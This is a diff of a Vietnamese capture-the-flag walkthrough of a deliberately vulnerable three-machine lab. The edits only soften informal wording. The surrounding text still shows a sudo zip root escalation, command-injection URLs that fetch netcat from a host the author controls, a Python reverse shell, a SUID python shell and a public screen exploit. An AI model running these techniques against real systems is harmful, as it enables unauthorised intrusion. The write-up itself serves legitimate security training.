@@ -425,8 +425,8 @@ does not hand over the rest.
 > ảo cố ý cài lỗ hổng, chạy trong mạng cô lập của riêng tôi. Đừng bao giờ đem các
 > kỹ thuật này test lên hệ thống bạn không sở hữu hoặc chưa có giấy phép.
 
-Nếu bạn mới tập tành penetration testing, một máy dạng boot-to-root là cách học tốt
-vào loại nhất. Khởi đầu trong tay chỉ có một địa chỉ IP, rồi từng bước leo lên quyền
+Nếu bạn mới bắt đầu học penetration testing, một máy dạng boot-to-root là cách học hiệu
+quả hàng đầu. Khởi đầu trong tay chỉ có một địa chỉ IP, rồi từng bước leo lên quyền
 root. Bài này đáng để bắt đầu, vì nó không phải một câu đố đơn lẻ. Nó là ba máy nối
 chuỗi với nhau, ta phải pivot từ máy này sang máy kế tiếp.
 
@@ -469,7 +469,7 @@ Setup tôi dùng:
 ### Tìm target
 
 Giả sử ta chưa biết IP của máy. Ta scan mạng nội bộ bằng `netdiscover`, tool này
-bắn ARP rồi liệt kê mọi host trả lời lại:
+gửi request ARP rồi liệt kê mọi host trả lời lại:
 
 ```bash
 netdiscover -i eth1 -r 192.168.1.0/24
@@ -560,14 +560,14 @@ sudo -u my2user /bin/bash /opt/scripts/check.sh
 
 Giờ đang là `my2user`, ta chạy `sudo -l` lần nữa. User này được chạy `zip` với quyền
 root mà không cần password. `zip` có trong [GTFOBins](https://gtfobins.github.io/gtfobins/zip/#sudo),
-nơi liệt kê cách biến các binary thường ngày thành tool leo quyền. Chiêu như sau:
+nơi liệt kê cách tận dụng các binary thường ngày để leo quyền. Cách làm như sau:
 
 ```bash
 TF=$(mktemp -u)
 sudo zip $TF /etc/hosts -T -TT 'sh #'
 ```
 
-Vì sao nó ăn, nói cho dễ hiểu:
+Vì sao cách này chạy được, nói cho dễ hiểu:
 
 - `zip` chạy với quyền root, nên thứ gì nó khởi chạy cũng là root.
 - `-T` bảo `zip` test cái archive sau khi tạo xong.
@@ -581,7 +581,7 @@ Xâm nhập mail server thành công. Flag 1 về tay.
 ## Flag 2: pivot sang web server
 
 Có root trên một máy hiếm khi là hết chuyện. Mô hình này nằm trong một mạng Docker
-nội bộ (`172.17.0.0/16`) mà ta chỉ thấy được từ mail server. Luồn tới các máy ẩn đó
+nội bộ (`172.17.0.0/16`) mà ta chỉ thấy được từ mail server. Tiếp cận các máy ẩn đó
 gọi là pivoting. Trước hết ta thả một SSH key lên mail server làm đường quay lại cho
 chắc, rồi mới dò.
 
@@ -620,7 +620,7 @@ Giờ `http://localhost:8000` chính là web server nội bộ.
 dirb http://localhost:8000
 ```
 
-Nó lòi ra folder `/ping/` list được, bên trong có `ping.php`. Một ghi chú trên trang
+Kết quả tìm ra folder `/ping/` list được, bên trong có `ping.php`. Một ghi chú trên trang
 bảo dùng param `host`, và nó đem giá trị đó chạy thẳng, không check gì:
 
 ```
@@ -634,7 +634,7 @@ chạy trên server.
 
 ### Lấy shell với quyền www-data
 
-Trước tiên ta tuồn một binary `netcat` lên target qua lỗ injection. Web user quyền
+Trước tiên ta tải một binary `netcat` lên target qua lỗ injection. Web user quyền
 thấp, không cài package được, nên ta `wget` một bản tự host:
 
 ```
@@ -642,7 +642,7 @@ http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.5:9000/nc
 http://localhost:8000/ping/ping.php?host=; chmod 777 nc
 ```
 
-Reverse shell bằng `nc` không nổ, vì bản build này thiếu option `-e`, nên ta chuyển
+Reverse shell bằng `nc` không chạy được, vì bản build này thiếu option `-e`, nên ta chuyển
 sang một dòng Python. Nó connect ngược về listener ta chạy trên mail server, chính
 là máy pivot của ta, tại `172.17.0.5:9000`:
 
@@ -668,7 +668,7 @@ Reverse thành công, ta vào được với quyền thấp của `www-data`.
 
 ### Hai user, hai đường leo quyền
 
-Lục các file của những user đáng chú ý, ta ra hai manh mối:
+Kiểm tra các file của những user đáng chú ý, ta thấy hai manh mối:
 
 ```bash
 find / -type f -user 1000 2>/dev/null   # Oscar
@@ -687,8 +687,8 @@ python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
 Cái `-p` là chế độ privileged: không hạ cái quyền vừa nâng được. Từ home của Oscar,
-ta moi ra password của anh ta (`H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`) rồi SSH vào
-đàng hoàng bằng account Oscar.
+ta lấy được password của anh ta (`H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`) rồi SSH vào
+trực tiếp bằng account Oscar.
 
 ### Lên root bằng PATH hijack
 
@@ -730,7 +730,7 @@ Giờ ta làm chủ web server. Tìm ra `2_flag.txt`.
 
 ## Flag 3: file server và database server
 
-### Lục file server qua FTP ẩn danh
+### Khai thác file server qua FTP ẩn danh
 
 Từ web server, ta với tới file server ở `172.17.0.2`, nơi cho phép FTP ẩn danh:
 login bằng username `anonymous`, password để trống.
@@ -770,8 +770,8 @@ Trên database server, `linpeas` (tool tự động dò đường leo quyền) s
 SUID: `screen-4.5.0`. Đúng cái version này có một lỗ hổng local root đã công bố,
 [Exploit-DB 41154](https://www.exploit-db.com/raw/41154).
 
-Nói gọn: `screen` chạy dưới quyền root, và bản này xử lý ẩu cái option log-file, nên
-bị lừa để nạp một shared library do attacker đưa vào, dưới quyền root. Cái exploit
+Nói gọn: `screen` chạy dưới quyền root, và bản này xử lý lỏng lẻo option log-file, nên
+bị lợi dụng để nạp một shared library do attacker đưa vào, dưới quyền root. Cái exploit
 người ta public ra là một shell script chạy một mình được: nó tự viết và compile hai
 file phụ nhỏ, một library và một chương trình root-shell bé tẹo, rồi khởi chạy
 `screen` để library đó nạp với quyền root:
